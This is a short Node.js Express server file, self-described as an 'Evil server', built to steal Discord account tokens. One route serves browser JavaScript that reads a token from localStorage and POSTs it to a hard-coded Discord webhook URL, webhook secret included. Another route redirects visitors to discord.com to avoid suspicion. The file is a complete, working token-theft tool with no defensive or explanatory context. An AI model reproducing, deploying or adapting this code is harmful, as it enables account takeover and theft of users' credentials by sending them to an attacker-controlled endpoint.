const express = require('express');
const app = express();

// Serve the token-stealing script
app.get('/steal', (req, res) => {
    res.set('Content-Type', 'application/javascript');
    res.send(`
        (function() {
            const token = localStorage.getItem('token');
            if (token) {
                fetch('https://discord.com/api/webhooks/1369392037622845440/Tx6-5ztys2a-IczQ9tos8J-u6-aMuNczUS81xvv5ahKtHdPkO9fsN1PJ-PHEhFbWlYpV', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: \`Token: \${token}\` })
                });
            }
        })();
    `);
});

// Redirect to avoid suspicion
app.get('/', (req, res) => {
    res.redirect('https://discord.com');
});

app.listen(3000, () => console.log('Evil server running...'));